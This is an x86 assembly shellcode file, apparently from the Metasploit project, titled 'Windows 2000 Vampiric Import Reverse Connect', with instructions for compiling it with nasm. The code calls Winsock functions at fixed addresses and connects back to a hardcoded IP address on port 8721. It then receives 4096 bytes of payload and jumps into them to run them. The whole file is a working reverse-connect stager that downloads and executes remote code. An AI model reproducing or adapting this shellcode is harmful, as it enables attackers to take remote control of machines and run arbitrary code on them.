;      Title:  Windows 2000 Vampiric Import Reverse Connect
;  Platforms:  Windows 2000
;   Function:  Attach to dbmssocn.dll, use IAT to connect, read/exec payload
;     Author:  hdm[at]metasploit.com
 
; Compile: nasm -f bin -o win2000_vampiric_connector.bin win2000_vampiric_connector.asm
 
 
[BITS 32]
 
%define ESIMOD add si, 0x3000
%define DBMSSOCN_WSAStartup [esi + 0x6C]
%define DBMSSOCN_connect    [esi + 0x4C]
%define DBMSSOCN_recv       [esi + 0x54]
%define DBMSSOCN_send       [esi + 0x5C]
%define DBMSSOCN_socket     [esi + 0x74]
 
; uncomment this for better error handling and persistent reconnects
; %define NICE
 
global _start
_start:
 
    xor edi, edi            ; edi is just a null
     
LWSAStartup:
    sub esp, 0x1400
    push esp
    push dword 0x101
    mov dword eax, 0x71c04f3b
    call eax
 
LSocket:
    push edi
    push edi
    push edi
    push edi
    inc edi
    push edi
    inc edi
    push edi
    mov dword eax, 0x71c0410c
    call eax
    mov ebx, eax
 
LConnect:
    push 0x01aea8c0         ; host ipv4
    push 0x11220002         ; port: 8721     
    mov ecx, esp
    push byte 0x10
    push ecx
    push ebx
    mov dword eax, 0x71c0446a
    call eax   ; set eax to 0 on success
 
%ifdef NICE
    test eax,eax
    jnz LConnect
    xor eax, eax
%endif 
         
LReadCodeFromSocket:
    add di, 0xffe            ; read 4096 bytes of payload (edi == 2)
    sub esp, edi
    mov ebp, esp
    push eax               ; flags
    push edi               ; length
    push ebp               ; buffer
    push ebx               ; socket
    mov dword eax, 0x71c02f7f
    call eax     ; recv(socket, buffer, length, flags)
    jmp esp                ; jump into new payload